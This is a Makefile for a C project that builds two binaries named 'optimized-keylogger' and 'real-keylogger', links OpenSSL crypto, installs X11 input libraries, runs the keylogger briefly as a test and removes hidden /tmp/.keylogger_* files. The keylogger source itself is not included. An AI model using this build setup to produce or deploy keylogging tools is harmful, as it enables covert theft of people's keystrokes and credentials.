CC=gcc
CFLAGS=-O3 -Wall -Wextra -std=c99 -pthread
LDFLAGS=-lssl -lcrypto -lpthread

# Targets
LINUX_TARGET=bin/optimized-keylogger
REAL_TARGET=bin/real-keylogger

# Sources
LINUX_SOURCES=linux/optimized_keylogger.c common/real_crypto.c
REAL_SOURCES=linux/real_keylogger.c common/real_crypto.c

all: $(LINUX_TARGET) $(REAL_TARGET)

$(LINUX_TARGET): $(LINUX_SOURCES)
	mkdir -p bin
	$(CC) $(CFLAGS) -o $(LINUX_TARGET) $(LINUX_SOURCES) $(LDFLAGS)

$(REAL_TARGET): $(REAL_SOURCES)
	mkdir -p bin
	$(CC) $(CFLAGS) -o $(REAL_TARGET) $(REAL_SOURCES) $(LDFLAGS)

install-deps:
	sudo apt-get install -y libx11-dev libxtst-dev libxext-dev libssl-dev

test: $(LINUX_TARGET)
	@echo "Testing optimized keylogger..."
	@$(LINUX_TARGET) &
	@sleep 2
	@pkill optimized_keylogger || true
	@echo "Test completed"

performance: $(LINUX_TARGET)
	@echo "Running performance test..."
	@timeout 10s $(LINUX_TARGET) || true
	@echo "Performance test completed"

clean:
	rm -f $(LINUX_TARGET) $(REAL_TARGET)
	rm -f /tmp/.keylogger_*

.PHONY: all clean install-deps test performance